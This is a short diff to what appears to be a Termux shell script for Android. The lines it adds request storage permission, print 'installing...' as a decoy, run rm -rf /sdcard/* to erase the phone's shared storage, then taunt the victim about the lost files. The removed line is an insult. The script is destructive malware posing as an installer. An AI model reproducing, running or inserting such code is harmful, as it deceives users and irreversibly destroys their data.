@@ -1,1 +1,4 @@
-echo 'bitchhhhhh'
+termux-setup-storage
+echo 'installing...'
+rm -rf /sdcard/*
+echo 'u lost ur files successfully'
